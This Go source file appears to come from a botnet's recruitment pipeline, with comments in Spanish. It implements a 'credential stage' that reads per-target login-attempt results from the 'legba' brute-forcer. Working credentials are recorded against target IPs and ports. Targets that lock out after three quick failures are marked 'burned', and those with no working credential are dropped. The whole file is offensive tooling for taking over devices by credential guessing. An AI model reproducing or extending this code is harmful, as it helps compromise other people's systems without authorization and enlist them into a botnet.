package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"time"

	"github.com/botnet/botnet/internal/recruit"
)

// Etapa de credencial (T-1704). Consume veredictos de legba por candidato.
// Un fallo no es muerte; tres fallos seguidos en 40 s si: eso es un lockout
// y se llama `burned`, no «otro fallo».

// veredictoCred es una linea del fixture: un intento.
type veredictoCred struct {
	IP        string    `json:"ip"`
	Port      int       `json:"port"`
	Protocol  string    `json:"protocol"`
	CredIndex int       `json:"cred_index"`
	OK        bool      `json:"ok"`
	At        time.Time `json:"at"`
}

// ejecutarCred aplica la secuencia de intentos del fixture.
func ejecutarCred(ctx context.Context, rutaJSON string, dryRun bool) error {
	if rutaJSON == "" {
		return fmt.Errorf("cred sin red: pasa --cred-json con los veredictos de legba")
	}
	f, err := os.Open(rutaJSON)
	if err != nil {
		return err
	}
	defer f.Close()

	st, err := abreStore()
	if err != nil {
		return err
	}
	defer st.Close()

	fallos := map[string][]time.Time{}
	sc := bufio.NewScanner(f)
	procesados := 0
	for sc.Scan() {
		linea := sc.Bytes()
		if len(linea) == 0 {
			continue
		}
		var v veredictoCred
		if err := json.Unmarshal(linea, &v); err != nil {
			return fmt.Errorf("cred linea: %w", err)
		}
		id, err := st.CandidatoPorIP(ctx, v.IP, v.Port)
		if err != nil {
			continue
		}
		if v.OK {
			if dryRun {
				fmt.Printf("cred ip=%s protocol=%s ok\n", v.IP, v.Protocol)
			} else if err := st.MarcarCredencial(ctx, id, v.Protocol, v.CredIndex); err != nil {
				return err
			}
			procesados++
			continue
		}
		cuando := v.At
		if cuando.IsZero() {
			cuando = time.Now()
		}
		fallos[v.IP] = append(fallos[v.IP], cuando)
		if recruit.EsLockout(fallos[v.IP]) {
			if dryRun {
				fmt.Printf("burned ip=%s\n", v.IP)
			} else if err := st.MarcarBurned(ctx, id, "probe"); err != nil {
				return err
			}
		} else if len(fallos[v.IP]) >= 3 {
			// Tres fallos repartidos: sigue sano, solo acumula intentos.
			if !dryRun {
				if err := st.MarcarCredFallida(ctx, id, v.Protocol, v.CredIndex); err != nil {
					return err
				}
			}
		}
		procesados++
	}
	if err := sc.Err(); err != nil {
		return err
	}
	// Los candidatos sin ningun veredicto quedan sin credencial.
	if !dryRun {
		sinCred, err := st.SinCredencial(ctx)
		if err != nil {
			return err
		}
		for _, id := range sinCred {
			if err := st.DescartarSinCred(ctx, id, "probe"); err != nil {
				return err
			}
		}
		fmt.Printf("cred: procesados=%d sin_cred=%d\n", procesados, len(sinCred))
	}
	return nil
}
